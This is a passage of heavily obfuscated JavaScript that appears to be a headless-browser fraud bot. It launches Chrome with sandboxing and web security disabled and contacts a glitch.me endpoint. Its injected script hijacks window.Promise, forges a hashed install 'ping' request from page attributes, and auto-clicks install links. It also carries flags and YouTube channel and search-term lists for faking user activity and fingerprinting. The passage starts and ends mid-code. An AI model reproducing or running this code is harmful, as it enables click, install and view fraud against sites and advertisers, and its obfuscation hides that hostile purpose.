this['hash']();
              }
            }
            ['hash']() {
              var J, K, L = this['h0'],
                M = this['h1'],
                N = this['h2'],
                O = this['h3'],
                P = this['h4'],
                Q = this['blocks'];
              for (J = -0x18f + -0x1301 * -0x2 + 0x747 * -0x5; J < 0xb4b + -0x1f32 + -0x9 * -0x23f; ++J)
                K = Q[J - (-0x1acc + 0x1925 + 0x2 * 0xd5)] ^ Q[J - (0x171b + 0x10fd + -0x2810)] ^ Q[J - (-0x653 * -0x1 + 0xf1f + -0x1564)] ^ Q[J - (-0x101 * 0x6 + 0xb1c + -0x506)], Q[J] = K << -0x1f48 + -0x14d + 0x2096 | K >>> 0x3 * -0xa5f + 0x2071 + -0x135;
              for (J = -0xcf7 + 0x1189 * 0x2 + -0x161b; J < 0x1f91 * 0x1 + -0x1209 + -0xd74; J += 0x1335 * -0x1 + 0x18e + -0xd * -0x15c)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x67c + 0x3d3 + 0x157 * 0x2 | L >>> 0x917 + -0x1328 + 0x174 * 0x7) + (M & N | ~M & O) + P + (-0x25af08f4 + 0x29 * -0x456da59 + 0x1321a7ace) + Q[J] << -0x1901 * -0x1 + 0x23 * 0xf1 + -0x39f4) << 0x5 * 0x71a + 0xea0 + -0x321d * 0x1 | P >>> -0x2 * 0x902 + -0x12d5 + 0xa * 0x3b2) + (L & (M = M << 0x2267 * -0x1 + 0xa53 * 0x3 + 0x38c | M >>> 0x12e9 + -0x2 * -0x79e + 0x2223 * -0x1) | ~L & N) + O + (0x3a0dceb2 + -0x13cb * -0x3a606 + -0x27c26ddb) + Q[J + (0x2e * 0xb + 0x1 * -0x163b + 0x1442)] << 0x6b * -0x27 + 0x6cd * -0x2 + 0x1de7) << 0x2c * -0x48 + -0x27 * -0xb5 + 0x3a * -0x43 | O >>> -0x6e3 + 0x2c4 + 0x43a) + (P & (L = L << 0x1ecb + -0x9e * 0x3 + -0x1cd3 | L >>> -0x6 * 0x660 + 0xa66 + -0x6f7 * -0x4) | ~P & M) + N + (0x8fd649c5 + 0x53 * -0x15cdffa + 0x3bc8cde2) + Q[J + (-0x9 * -0x261 + 0x1 * 0xf3b + -0x1251 * 0x2)] << 0x36e + 0x1d77 * -0x1 + 0x2b * 0x9b) << 0x737 * 0x1 + -0x1 * -0x24b0 + 0x2 * -0x15f1 | N >>> -0x237f + -0x1ede + -0x3 * -0x1628) + (O & (P = P << 0x4a0 + 0x11ae + -0x50 * 0x47 | P >>> -0x432 * -0x1 + -0xf05 + 0xad5) | ~O & L) + M + (-0x5 * 0x1b8509a9 + 0x97 * 0x102caa5 + 0x4b762293) + Q[J + (0x10d7 + -0x2244 + 0x12 * 0xf8)] << 0x46 * -0x3e + 0x239f + -0x12ab) << 0x2089 + -0x452 + -0x1c32 * 0x1 | M >>> 0xe87 + -0x19ec + -0x170 * -0x8) + (N & (O = O << -0x7 * 0x14f + 0xe * 0x106 + -0x50d | O >>> -0x4 * 0x5c9 + -0x1eed * -0x1 + -0x7c7) | ~N & P) + L + (-0x8a83461 + -0x316ccc28 + -0x35 * -0x2cdb9da) + Q[J + (-0x22a8 * -0x1 + -0x1a3 * 0x12 + 0x297 * -0x2)] << 0x130e + -0x14 * 0xbe + -0x436, N = N << 0x2d3 * -0x3 + 0x9a4 + 0x1 * -0x10d | N >>> -0x1 * 0x13fa + -0x19c6 + 0x2dc2;
              for (; J < -0x2032 + -0x2216 + 0x1 * 0x4270; J += 0x1aa4 + 0x2397 + -0x3e36)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x2569 + -0x2 * 0x1201 + 0x4970 | L >>> -0xeb6 + -0x85 + 0x1a * 0x97) + (M ^ N ^ O) + P + (0x4d99572f * 0x2 + 0x71e60 * -0x8d7 + 0x1 * 0x1294bfe3) + Q[J] << -0x42 * -0x25 + 0x1908 + -0x2292) << 0x6f8 + 0x1176 * -0x1 + 0xa83 * 0x1 | P >>> -0x18a5 + 0x8 * 0x2fb + 0x1 * 0xe8) + (L ^ (M = M << 0x4dc + 0x4 * 0x7f2 + -0x2486 | M >>> 0x1d1b + -0x3 * 0x139 + -0x516 * 0x5) ^ N) + O + (0x1 * -0xb359a4fd + 0x73296268 + 0x8b81 * 0x14136) + Q[J + (0x7 * 0x46c + 0xfa0 + -0x2e93)] << -0xc7f + -0x1926 + 0x1a3 * 0x17) << -0x2 * -0x575 + -0xf95 + 0x18 * 0x32 | O >>> -0x4 * -0x261 + -0x26c3 + -0xd * -0x242) + (P ^ (L = L << 0x2 * -0xaa2 + -0x13c + -0x1e * -0xc1 | L >>> 0x2371 + 0x59 * 0x39 + -0x3740) ^ M) + N + (0x15a2bd * 0x68f + 0x6dcbe864 + -0xad5902e * 0xd) + Q[J + (0xaf6 + -0x139f * 0x1 + 0x8ab)] << -0x1 * -0xd7c + -0x2588 + 0x180c) << -0x2c8 + 0x299 + 0x34 | N >>> 0x11dc + 0x7f1 + -0x19b2) + (O ^ (P = P << 0x24a2 + -0x1 * -0x2486 + -0x2485 * 0x2 | P >>> 0x1d * 0xa5 + 0x1 * 0x1247 + 0x53 * -0x72) ^ L) + M + (-0xdd042755 * 0x1 + -0xd8f847d3 + 0x224d65ac9) + Q[J + (-0x17fb + -0x144 + 0x1942)] << 0x267 * -0xf + -0x1 * -0x25ef + -0x1e6) << 0x1a10 + 0x25ac + -0x3fb7 | M >>> 0x13 * 0x107 + 0x53f * 0x1 + 0x18a9 * -0x1) + (N ^ (O = O << 0x5 * 0x547 + -0x2619 + 0x2 * 0x5ea | O >>> 0x16e3 + -0x9d3 + -0xd0e) ^ P) + L + (0x513b1e19 + 0x89d602b4 * -0x1 + 0xa774d03c) + Q[J + (0x2 * -0x35 + 0x2 * 0x6ad + -0xcec)] << 0x7b6 + -0x12a * 0xf + 0x18 * 0x68, N = N << -0x1341 + -0x22b8 + 0x1 * 0x3617 | N >>> -0x610 + -0x1f0 + -0x19a * -0x5;
              for (; J < 0x1ab3 + 0x1239 * 0x2 + -0x3ee9 * 0x1; J += 0xf99 + 0x4 * -0x3d5 + -0x40)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x419 * -0x3 + -0x7d3 + 0x1423 | L >>> -0x6 * 0x31e + -0x244b + 0x371a) + (M & N | M & O | N & O) + P - (-0x589e0469 + 0xa0832a75 + 0x28ff1d18) + Q[J] << -0x13 * 0xe5 + 0xecb + 0x4 * 0x8d) << -0x16 * -0x10b + 0x491 + 0x99 * -0x2e | P >>> 0x294 * -0x5 + 0x23 * -0x6d + 0x1be6) + (L & (M = M << 0x997 * -0x1 + -0x342 * 0x2 + 0x1039 | M >>> 0x17b * -0x5 + 0x245 + 0x524) | L & N | M & N) + O - (-0x160b8b * -0x457 + -0xdec87 * 0xc67 + 0xbde8a938) + Q[J + (-0x18da + -0x91 * -0x22 + 0x599)] << 0x3 * -0x7ae + -0xf * 0x119 + 0x2781) << -0x26bf + 0x24a1 + 0x223 | O >>> 0x692 * -0x1 + -0x3 * 0x2a5 + 0xe9c) + (P & (L = L << 0x24af + -0x1974 + -0xb1d | L >>> 0x1dd + 0xceb * -0x3 + 0x24e6) | P & M | L & M) + N - (-0x6 * 0x2594a0fe + 0xfbbb * -0x6337 + -0x1b3ef6f45 * -0x1) + Q[J + (-0x747 + -0x74b * 0x5 + 0x2bc0)] << 0x2132 + 0xeab + -0x2fdd) << -0x562 + -0x2287 + 0x26 * 0x10d | N >>> 0x1433 * -0x1 + -0xb * 0x1ee + 0x2988) + (O & (P = P << 0x9bc * 0x3 + -0xf8e + -0xd88 | P >>> 0x2 * 0xe5d + -0x72 * -0x2d + -0x30c2) | O & L | P & L) + M - (0x69d * 0x1877af + -0x22246562 + -0x1 * 0xec6d7cd) + Q[J + (0x19 * 0x15f + -0x981 + 0x18c3 * -0x1)] << -0x2680 + 0x1dd1 + 0x3 * 0x2e5) << -0x1 * 0x12fd + 0x191e * -0x1 + 0x2c20 | M >>> -0xc7a * 0x2 + -0x16ce + -0x2fdd * -0x1) + (N & (O = O << 0x3 * -0x1d7 + 0xfa5 + -0xa02 | O >>> -0x4 * -0x2de + 0x2074 + -0x2bea) | N & P | O & P) + L - (-0x33 * 0xfd13a5 + -0x8e1d2fb * -0x1 + 0xa1083 * 0xf58) + Q[J + (-0x1 * -0x2223 + -0x5 * -0x78b + -0x23eb * 0x2)] << -0xa9d + 0x115f * 0x2 + 0xd5 * -0x1d, N = N << -0x1 * 0xcec + 0x3ef + 0x15 * 0x6f | N >>> -0x1 * 0x13d1 + 0x1687 + -0x2b4;
              for (; J < 0x1ee + -0xeeb + 0xd4d; J += -0x164f * 0x1 + 0x500 + 0x1154)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0xae5 * 0x1 + -0x2025 + 0x2b0f * 0x1 | L >>> 0x2 * 0x73c + -0x6b6 + -0x7a7) + (M ^ N ^ O) + P - (0x217126db + -0x5c20d75 + 0x256c * 0xb163) + Q[J] << -0x1e6b + -0x14bd + 0x3328) << 0xf51 + 0x85f + -0x17ab | P >>> 0x26b1 + -0xb09 * 0x2 + -0x1084) + (L ^ (M = M << -0x13a * 0x1 + 0x22bd + 0x67 * -0x53 | M >>> -0x47 * -0x11 + 0x8 * -0xd0 + 0x1cb * 0x1) ^ N) + O - (-0x1aed48fb + -0x7f0fb0f + 0x587b8234) + Q[J + (-0x12 * 0x166 + -0xf13 + -0x2e * -0xe0)] << 0x1f01 + -0xe10 + -0x10f1 * 0x1) << -0x206 * 0x7 + 0x1a3 * 0x3 + 0x946 | O >>> -0x631 + -0x377 * 0x7 + 0x1e8d) + (P ^ (L = L << 0x104b * 0x2 + -0x1 * -0x12f6 + 0x19b7 * -0x2 | L >>> -0x1ae0 + 0x1ffe + -0x51c) ^ M) + N - (0x2cd62825 * -0x1 + -0xda00650 + 0x89f085b * 0xd) + Q[J + (-0x169f * -0x1 + 0x186d + 0x1b * -0x1be)] << -0x448 + 0x15 * 0x12f + -0x1493) << 0xa67 * 0x1 + 0xbe5 + -0x1647 | N >>> -0x8a9 * -0x1 + -0x1f68 + 0x16da) + (O ^ (P = P << -0x431 * 0x4 + 0x1 * 0x8e0 + 0x802 | P >>> 0xb3 * 0x29 + -0xafb * 0x2 + -0x6b3) ^ L) + M - (0x35292dda + -0x39134c42 + 0x39875c92) + Q[J + (-0x1bc8 + -0x3ab + 0x2 * 0xfbb)] << 0x11d3 + -0x11 * -0x13 + -0xe * 0x15d) << -0x208c + 0x22 * -0x7c + 0x3109 | M >>> -0x42 * 0x71 + 0x1b54 + 0x1e9) + (N ^ (O = O << -0x13 * -0x6b + 0x2 * -0x2dc + -0x21b | O >>> 0x15d5 + -0x120d * -0x1 + -0x3a0 * 0xb) ^ P) + L - (0x308e4c2 * 0x2 + 0x4996b9f5 + -0xf1 * 0x1baa3f) + Q[J + (-0x2031 + 0x21 * -0x95 + 0x336a)] << 0x1a6c + -0x21e6 + 0x77a, N = N << -0xfb * -0x5 + -0x61 * -0x67 + -0x2bd0 * 0x1 | N >>> 0x6d * -0x23 + 0x64 + -0xe85 * -0x1;
              this['h0'] = this['h0'] + L << 0xefc + -0x20de + 0x15 * 0xda, this['h1'] = this['h1'] + M << -0x2424 + 0xd * 0x2a5 + -0x1c3 * -0x1, this['h2'] = this['h2'] + N << 0xb4e + -0x5 * 0x203 + -0x13f, this['h3'] = this['h3'] + O << -0x14 * 0x119 + -0x1 * -0x6d1 + 0xf23, this['h4'] = this['h4'] + P << 0x201c + -0x62 + -0x1fba;
            }
            [T(0x9)]() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> 0xc77 * -0x2 + -0x26ff + 0x4009 & 0xfe + 0x68 * -0x3 + 0x49] + w[J >> 0x946 * 0x1 + -0xfe3 + -0x65 * -0x11 & -0x10f5 + -0x5 * -0x279 + -0x18d * -0x3] + w[J >> -0x1 * -0x1c49 + -0x1659 + 0x6 * -0xfa & -0xc7 * 0x9 + -0x517 * -0x7 + -0x1c93] + w[J >> -0x22b6 + 0xd12 + 0x4 * 0x56d & 0x14f3 * -0x1 + -0x77d * -0x4 + -0x8f2] + w[J >> 0x3c7 * 0x9 + 0x1d82 + -0x3f75 & 0x1 * 0x215 + -0x2c8 * 0x5 + 0xbe2] + w[J >> 0x1 * -0xcf7 + 0x10ea + 0x3eb * -0x1 & -0x2 * 0x11f2 + 0x24f2 + -0x11 * 0xf] + w[J >> -0x274 * 0x7 + -0x2679 + 0x37a9 & -0x3 * -0xcfb + 0x3fb * 0x1 + -0x1 * 0x2add] + w[0x146e + 0x2131 + -0x3590 & J] + w[K >> -0xecd + 0x4 * 0x241 + 0x1f7 * 0x3 & 0x189a + 0x3b * 0x15 + 0x1 * -0x1d62] + w[K >> 0x3d * 0x96 + -0x69a * 0x2 + 0xb39 * -0x2 & 0x1 * -0x1773 + 0x187c * -0x1 + -0x2ffe * -0x1] + w[K >> 0x217f * 0x1 + 0x3 * -0x709 + -0xc50 & -0x1a1 + 0x2f * -0x66 + 0x146a] + w[K >> 0x2657 + -0x260e + -0x39 & -0x951 * -0x3 + 0x220b + -0x8d9 * 0x7] + w[K >> 0x52 * 0x1f + 0x929 + 0x3 * -0x659 & -0xd51 * 0x2 + 0xad * -0x1 + -0x1 * -0x1b5e] + w[K >> -0x23 * 0x16 + 0x1066 + -0x357 * 0x4 & 0x2241 + -0x7ea + -0x8 * 0x349] + w[K >> -0xa90 + 0x84f * -0x3 + -0x1 * -0x2381 & -0x3 * 0x2b + -0x2 * -0xd32 + -0x675 * 0x4] + w[-0x23cd + -0x12e * -0x5 + 0x1df6 & K] + w[L >> 0x22e6 + -0x2505 + 0x23b & 0x155b + 0xd61 + -0x22ad] + w[L >> -0xe5 * 0xa + 0x2 * 0xd21 + -0x1138 & -0x1939 + -0x1 * 0xae5 + 0x242d * 0x1] + w[L >> 0x22 * -0x79 + 0x915 + 0x711 & -0x2596 + 0x2 * -0x316 + 0x2bd1] + w[L >> -0x7b * 0x22 + 0x144f + -0x3e9 & -0x34 * 0x53 + 0xe61 + 0x28a] + w[L >> 0x1af + 0x14d2 + -0x1 * 0x1675 & -0x211e + -0x142f + 0xa * 0x556] + w[L >> -0x7 * 0x283 + -0x1bb0 + -0x1 * -0x2d4d & 0x3 * 0x137 + -0xe98 + 0xb02] + w[L >> -0x969 + 0x3 * 0xca9 + -0x5 * 0x5b6 & -0x35 * 0x49 + -0x1fc2 + 0x2eee] + w[-0x257 * -0x6 + -0x15 * 0xcb + -0x156 * -0x2 & L] + w[M >> 0x1d91 + 0xb5d + -0xbe * 0x37 & -0x1 * -0xc91 + 0x29 * 0xa9 + -0x21 * 0x133] + w[M >> 0x47 * -0x37 + -0x9 * 0x9e + 0x14e7 & -0x1 * 0x17f6 + 0x1882 * -0x1 + 0x3087] + w[M >> -0x1f * 0xac + 0x1d50 + -0x868 & -0x147e + -0x209a * 0x1 + 0x3527] + w[M >> 0xa42 * -0x3 + 0x1711 + -0x9 * -0xdd & -0x14af * 0x1 + 0x1834 + -0x376] + w[M >> -0x1 * -0x1dde + 0xaba + -0x288c & -0x23f6 + 0x3 * 0xced + 0x2c2 * -0x1] + w[M >> 0x289 * -0x1 + -0x1 * -0x1b7 + 0xda & -0x3 * -0xc89 + -0x1984 + -0xc08 * 0x1] + w[M >> -0x10eb + 0x2655 + 0xf9 * -0x16 & 0x23c + -0x1568 + 0x133b] + w[0x11c3 + -0x1dec + -0x4 * -0x30e & M] + w[N >> 0x525 * -0x5 + -0x7ff * 0x2 + 0x2b * 0xf9 & -0xa * -0x115 + -0x517 * 0x2 + -0x95] + w[N >> 0xa7 * -0x5 + 0x19ff + -0x16a4 & -0xfa8 + 0x39e + 0xc19] + w[N >> 0x1156 + 0xc28 + -0x5 * 0x5e2 & 0x20b6 + 0x6f * -0x1b + 0xa79 * -0x2] + w[N >> 0xdef + -0xeb6 + 0xd7 & -0x5c1 * 0x1 + 0xe1a + 0x84a * -0x1] + w[N >> -0x126d + -0xa99 * 0x3 + 0xc91 * 0x4 & 0x95 * -0x25 + -0x9 * -0x365 + 0x1 * -0x8f5] + w[N >> 0x11 * -0x152 + 0x337 + 0x1343 & 0x105f + 0x1e87 + 0x1 * -0x2ed7] + w[N >> -0x3 * 0xa6 + -0x2520 + -0x2 * -0x138b & -0x1f94 + 0x1 * -0x1b65 + 0x3b08] + w[-0xa27 * -0x2 + 0x3 * 0x2b9 + -0x1c6a & N];
            }
            ['digest']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> -0x1 * 0xa91 + 0x5 * -0x1b1 + -0x2 * -0x98f & -0x1a12 + 0x14e7 * -0x1 + 0x133 * 0x28,
                J >> -0x13 * -0x1b8 + -0x19df + -0x6b9 & 0x37f + 0x110b * -0x2 + 0x1f96,
                J >> 0xc * 0x2dd + 0xa9e + 0x416 * -0xb & 0x1 * -0x6c9 + -0x2 * 0x712 + 0x15ec,
                0x48c + 0x11f1 * -0x2 + 0x2055 & J,
                K >> -0x660 + 0x1b12 + -0x12 * 0x125 & -0x18a5 * 0x1 + 0x1623 + 0x381,
                K >> 0x2af + -0x2 * -0x1223 + -0x26e5 & 0x100b + 0x2 * -0x3cb + -0x776,
                K >> 0x1282 + 0x1c5 + -0x143f & -0x266f + 0x1df5 + -0x1 * -0x979,
                0xe1 * 0x1b + 0x20cc + -0xde2 * 0x4 & K,
                L >> -0x970 + 0x22b1 * 0x1 + 0x39 * -0x71 & -0x1 * -0x57b + -0x194 * -0xa + -0x1444,
                L >> 0x47 * 0x5b + -0x4c1 * -0x3 + 0x1 * -0x2770 & 0x3 * -0x2e3 + -0x164d + 0x3 * 0xaa7,
                L >> -0x25fa + 0x275 + 0x238d & 0x13d1 + -0x107d * 0x2 + 0xe28,
                0x992 * 0x4 + 0x13a6 + -0x37 * 0x109 & L,
                M >> 0xa1a + 0x56a + -0xf6c & 0xb5 * -0x10 + -0x3 * 0x947 + 0x1c * 0x16f,
                M >> 0xedb * 0x1 + 0x9 * -0x3bb + 0x964 * 0x2 & 0xb5 * -0x7 + 0x1c1 * -0xf + 0x167 * 0x17,
                M >> -0x185e + -0x187f + 0x1 * 0x30e5 & 0x5 * 0x30b + -0x16 * 0xe3 + 0x2a5 * 0x2,
                -0x25bf + 0x24bb * -0x1 + -0x1 * -0x4b79 & M,
                N >> 0x1d81 + -0x56 * 0x4a + 0x5 * -0xe9 & 0x214b + -0x1e06 + 0x246 * -0x1,
                N >> -0x21f6 + -0xe7b + 0x3081 & -0x152a + 0x1a77 * -0x1 + 0x30a0,
                N >> -0x28a + -0x1 * -0x707 + -0x475 & -0xd92 * 0x1 + 0x18f1 + -0xa60,
                0x1aab + 0x1 * 0x11af + 0x1 * -0x2b5b & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(-0x5 * 0x72f + -0xf4f + 0x334e), (K = new DataView(J))['setUint32'](0x3 * 0x48d + 0x24a2 + 0x1 * -0x3249, this['h0']), K['setUint32'](0x143d + 0x44f * 0x3 + -0x2126 * 0x1, this['h1']), K['setUint32'](0x18fd * -0x1 + 0xae5 + 0x1 * 0xe20, this['h2']), K['setUint32'](0x9d * -0xd + 0xbef + -0x3ea, this['h3']), K['setUint32'](-0x80 * 0x1a + -0x2e * 0xa1 + 0x29fe, this['h4']), J;
            }
        }
        G['prototype']['toString'] = G['prototype']['hex'], G['prototype']['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[0x1 * 0x17b9 + 0x10cd + -0x2 * 0x1443];
        return window['Promise'] = class extends window['Promise'] {
          constructor(...J) {
            let K = 0x1ff1 + -0x85d + -0x1794;
            J[-0x1 * 0x1fb8 + 0x45 + 0x1f73]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (J[-0x1c84 + -0x1d5 * -0x2 + 0x18da] = L => {
              const U = b;
              let M = I['getAttribu' + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I['getAttribu' + 'te']('data-ip-ad' + 'dress') + I['getAttribu' + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open'](U(0x0, 'AhIR'), M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), -0x18a8 * 0x1 + -0x5d1 * -0x1 + 0x12d8), O['overrideMi' + 'meType']('text/plain'), O['onload'] = () => {}, O['send'](), K = 0xa5 * -0x2d + 0x1184 + 0xb7e;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          I['click']();
        }, 0xcaa * 0x1 + 0x444 + 0x6d * -0x1a), Promise['resolve'](-0x1 * 0x1779 + 0x8 * 0x2ae + 0x20a);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r['close'](), i())) : (await s['close'](), await r['close'](), i());
    }
  }
  for (let j = -0x28f + 0x204e + -0x1dbf; j < -0x829 * 0x1 + 0x4e * -0x56 + -0x225e * -0x1; j++)
    i();
}

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (0x11 * 0x96 + -0xb1f * -0x1 + -0x1515 * 0x1);
    let h = e[f];
    if (b['JiLMhO'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = 0x57b * 0x1 + -0x5d * 0x5 + -0x3aa, s, t, u = 0x1 * 0xba5 + -0x2263 + -0x29 * -0x8e; t = n['charAt'](u++); ~t && (s = r % (-0x16f3 + -0x570 + 0xb * 0x295) ? s * (0x5 * 0x180 + -0x158 * -0x14 + -0x2220) + t : t, r++ % (-0xd96 + -0x1 * 0x921 + 0x16bb)) ? p += String['fromCharCode'](0x1487 * -0x1 + 0x8fc + 0xc8a & s >> (-(-0x665 * -0x3 + -0x7a6 + -0xb87) * r & 0x925 + 0x1 * 0x210b + -0x2a2a)) : 0x1c33 + 0x944 + 0x45 * -0x8b) {
          t = o['indexOf'](t);
        }
        for (let v = 0xae2 * -0x1 + -0x13d4 + -0x1 * -0x1eb6, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](0x148a + 0x43 * -0x5 + 0x1 * -0x132b))['slice'](-(-0x2194 + -0x1641 * 0x1 + -0x37d7 * -0x1));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = 0x1952 + -0x1868 + -0xea,
          r, t = '';
        n = i(n);
        let u;
        for (u = 0x2109 + 0x1 * 0x1f67 + -0x4070 * 0x1; u < 0x1c64 + -0x1dcc + 0x38 * 0xb; u++) {
          p[u] = u;
        }
        for (u = -0x6e3 + 0x886 + -0x1a3; u < 0xf02 + -0x2537 + -0x1 * -0x1735; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (0x19 * -0x103 + -0x781 + 0x6 * 0x5a2), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = -0x1ea0 + -0x26 + -0x521 * -0x6, q = -0x9c0 + -0x858 + 0xc1 * 0x18;
        for (let v = 0x1 * -0x11cf + 0x15 * 0x146 + -0x8ef; v < n['length']; v++) {
          u = (u + (0x96e + -0x6fa + -0x39 * 0xb)) % (0x11 * -0xb3 + 0x1831 + -0xb4e), q = (q + p[u]) % (0x17 * -0x53 + 0x2450 + -0x1bdb), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (-0x3f0 + 0x1cc + -0x1 * -0x324)]);
        }
        return t;
      };
      b['ONzBVx'] = m, c = arguments, b['JiLMhO'] = !![];
    }
    const j = e[-0x1a4a + 0x4b3 + 0x1597 * 0x1],
      k = f + j,
      l = c[k];
    return !l ? (b['gWAHqb'] === undefined && (b['gWAHqb'] = !![]), h = b['ONzBVx'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}
const NETWORK_PATIENCE = 0x259 * 0x17 + -0x4cd * 0x3 + -0x858 + (0x284 + 0x6f7 * -0x1 + 0x102b) * Math['random'](),
  MM_NETWORK_PATIENCE = (-0x131e + 0x1e92 + -0xb71) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + V(0x2, 'l4Ua'),
      '--disable-' + 'web-securi' + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    'https://ww' + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + V(0x7, 'ePJz'),
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCUaT_39' + 'o1x6qWjz7K' + '2pWcgw',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + W(0x6) + 'com/@quade' + 'caX8',
    'https://ww' + 'w.youtube.' + 'com/@watch' + 'er',
    'https://ww' + 'w.youtube.' + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + 'com/@RyanG' + 'eorge',
    'https://ww' + 'w.youtube.' + 'com/@Legal' + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    'https://ww' + 'w.youtube.' + 'com/@fanta' + 'no',
    'https://ww' + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    'https://ww' + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + W(0x6) + 'com/channe' + 'l/UCxjrNGr' + 'X188Riipfm' + 'vejjsg'
  ];
((() => {
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = -0x23bb + 0x7fa * 0x2 + -0x13c7 * -0x1; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array['prototype']['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    let i = this[floor(random() * this['length'])];
    f['has'](h) || f['set'](h, new Set());
    const j = f['get'](h);
    for (; j['has'](i);)
      j['size'] === this['length'] && j['clear'](), i = this[floor(random() * this['length'])];
    return j['add'](i), i;
  };
})());
let searchTerms = [];
searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), searchTerms['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 